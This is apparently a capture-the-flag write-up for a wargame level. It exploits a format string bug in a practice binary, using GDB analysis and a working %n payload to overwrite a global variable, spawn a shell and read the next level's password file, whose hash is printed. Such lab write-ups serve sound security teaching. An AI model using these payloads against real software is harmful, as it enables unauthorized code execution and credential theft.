# 🚀 Level 3 - Format String Exploit
## 🧪 First Step - Testing the Program
```bash
$ ./level3
coucou
coucou
```
- 🧾 The program waits for input and echoes it back.

## 🐞 Start the Program in GDB
```bash
(gdb) disas main
...
0x08048520 <+6>:	call   0x80484a4 <v>
```
- 📌 The main function simply calls another function named v.
- 🔍 Analyze the v Function

The v function:
1. Allocates space on the stack.
2. Reads user input into a buffer with fgets.
3. Prints it back with printf.
4. Compares a global variable (m) with 0x40 (64 decimal).
5. If equal, it calls system().
```bash
(gdb) info variables
...
0x0804988c  m
```
- 🎯 We need to make m = 64 to trigger the system() call.
- ⚠️ The printf call is insecure because it prints user input directly: printf(buffer). This allows a format string exploit.

## 🧪 Triggering the Format String Vulnerability
```bash
$ echo "%s" | ./level3
Segmentation fault (core dumped)

$ echo "%x %x %x %x" | ./level3
200 b7fd1ac0 b7ff37d0 25207825
```
- 🔍 We're printing stack values using %x.

Now identify our input’s position on the stack:
```bash
$ echo "BBBB %x %x %x %x %x %x" | ./level3
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
```
- ✅ Our input "BBBB" appears as 42424242, which is in the 4th stack position.
- 🎯 Writing to Memory with %n

To write to address 0x0804988c (the m variable), inject it at the start of the payload and use %n:
```bash
$ python3 -c 'print("\x8c\x98\x04\x08" + "%4$n")' | ./level3
```
- 💡 %n writes the number of printed bytes (currently just 4) to the provided address.

We want to write 64 (0x40), so we pad the input to 64 bytes before %n.
```bash
$ python3 -c 'print("\x8c\x98\x04\x08" + "B"*60 + "%4$n")' | ./level3
Wait what?!
```

## ✅ Get the Shell and the Password
To interact with the shell spawned by system("/bin/sh"), keep stdin open:
```bash
$ (python3 -c 'print("\x8c\x98\x04\x08" + "B"*60 + "%4$n")'; cat -) | ./level3
Wait what?!
whoami
level4
cat ~level4/.pass
```
```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
- 🎉 Done!
